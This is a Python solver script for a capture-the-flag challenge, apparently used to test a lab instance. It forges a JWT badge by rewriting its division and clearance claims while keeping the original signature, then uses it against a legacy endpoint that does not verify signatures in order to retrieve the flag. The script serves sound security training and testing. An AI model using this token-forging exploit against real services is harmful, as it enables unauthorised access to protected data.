#!/usr/bin/env python3
"""PHANTOM BADGE — automated solver.

Demonstrates the intended vulnerability end to end against a running instance,
using only the public HTTP surface: it never reads application source, Docker
internals, the signing key or challenge.yml, and never hard-codes the flag.

Exploit summary
---------------
The portal issues an HS256 badge (JWT) for ``contractor-073`` with
``division=FIELD_SUPPORT`` / ``clearance=TECH-0``. The modern service
``/api/identity/me`` verifies the signature cryptographically; the legacy
compatibility route ``/api/legacy/cipher/access`` validates every claim but
*trusts the signature as already checked by the upstream gateway*. Swapping the
payload to ``CIPHER`` / ``TECH-2`` while keeping the original (now invalid)
signature is therefore rejected by the modern service (401) but accepted by the
legacy terminal (200), which returns the classified report and its proof id.
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import sys

import requests


class SolveError(RuntimeError):
    """Fatal, human-readable solver failure."""


def b64u_decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def b64u_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def login(
    session: requests.Session, base: str, username: str, password: str, timeout: float
) -> None:
    page = session.get(f"{base}/login", timeout=timeout)
    page.raise_for_status()
    match = re.search(r'name="csrf_token" value="([^"]+)"', page.text)
    if not match:
        raise SolveError("CSRF token not found on /login — unexpected portal layout.")
    response = session.post(
        f"{base}/login",
        data={"csrf_token": match.group(1), "username": username, "password": password},
        timeout=timeout,
        allow_redirects=False,
    )
    if response.status_code != 303 or session.cookies.get("phantom_session") is None:
        raise SolveError(f"Login failed for {username!r} (HTTP {response.status_code}).")


def fetch_badge(session: requests.Session, base: str, timeout: float) -> str:
    response = session.get(f"{base}/api/session/badge", timeout=timeout)
    if response.status_code != 200:
        raise SolveError(f"Could not obtain a badge (HTTP {response.status_code}).")
    badge = response.json().get("badge")
    if not badge or badge.count(".") != 2:
        raise SolveError("Badge endpoint did not return a compact JWT.")
    return badge


def forge_cipher_badge(badge: str) -> str:
    """Return the badge with CIPHER/TECH-2 claims and the ORIGINAL signature kept."""
    header, payload, signature = badge.split(".")
    claims = json.loads(b64u_decode(payload))
    claims["division"] = "CIPHER"
    claims["clearance"] = "TECH-2"
    forged_payload = b64u_encode(json.dumps(claims, separators=(",", ":")).encode())
    return f"{header}.{forged_payload}.{signature}"


def call_api(session: requests.Session, base: str, endpoint: str, token: str, timeout: float):
    response = session.get(
        f"{base}{endpoint}",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
    )
    try:
        body = response.json()
    except ValueError:
        body = {}
    return response.status_code, body


def solve(base: str, username: str, password: str, timeout: float) -> str:
    base = base.rstrip("/")
    session = requests.Session()
    session.headers["User-Agent"] = "phantom-badge-solver/1.0"

    login(session, base, username, password, timeout)
    badge = fetch_badge(session, base, timeout)
    claims = json.loads(b64u_decode(badge.split(".")[1]))
    print(f"[*] Legitimate badge: {claims['sub']} · {claims['division']} / {claims['clearance']}")

    status, _ = call_api(session, base, "/api/identity/me", badge, timeout)
    print(f"[*] Legit badge on PHANTOM v2  /api/identity/me        -> {status} (expect 200)")
    status, body = call_api(session, base, "/api/legacy/cipher/access", badge, timeout)
    print(
        f"[*] Legit badge on CIPHER v1   /api/legacy/cipher/access -> {status} "
        f"({body.get('access_policy', '?')}) (expect 403)"
    )

    forged = forge_cipher_badge(badge)
    print("[*] Forged badge: division=CIPHER clearance=TECH-2, original signature kept (invalid).")

    status_modern, body_modern = call_api(session, base, "/api/identity/me", forged, timeout)
    print(f"[*] Forged badge on PHANTOM v2 /api/identity/me        -> {status_modern} "
          f"({body_modern.get('reason', body_modern.get('status', '?'))}) (expect 401)")
    if status_modern != 401:
        raise SolveError(
            "Modern service did not reject the forged badge — vulnerability assumption broken."
        )

    status_legacy, body_legacy = call_api(
        session, base, "/api/legacy/cipher/access", forged, timeout
    )
    print(f"[*] Forged badge on CIPHER v1  /api/legacy/cipher/access -> {status_legacy} "
          f"({body_legacy.get('status', '?')}) (expect 200)")
    if status_legacy != 200 or body_legacy.get("status") != "ACCESS_GRANTED":
        raise SolveError("Legacy terminal did not grant access with the forged badge.")

    report = body_legacy.get("report") or {}
    proof = report.get("proof_id")
    if not proof:
        raise SolveError("Access granted but no proof id in the report.")
    print(f"[*] Report unlocked: {report.get('id')} — {report.get('declarant')}")
    return proof


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="PHANTOM BADGE solver")
    parser.add_argument("--url", default="http://127.0.0.1:8081", help="Base URL of the instance.")
    parser.add_argument("--username", default="contractor.073", help="Portal username.")
    parser.add_argument("--password", default="PHANTOM-073-2147", help="Portal password.")
    parser.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout (s).")
    args = parser.parse_args(argv)
    try:
        flag = solve(args.url, args.username, args.password, args.timeout)
    except (SolveError, requests.RequestException) as error:
        print(f"[!] FAILED: {error}", file=sys.stderr)
        return 1
    print(f"\n[+] FLAG: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
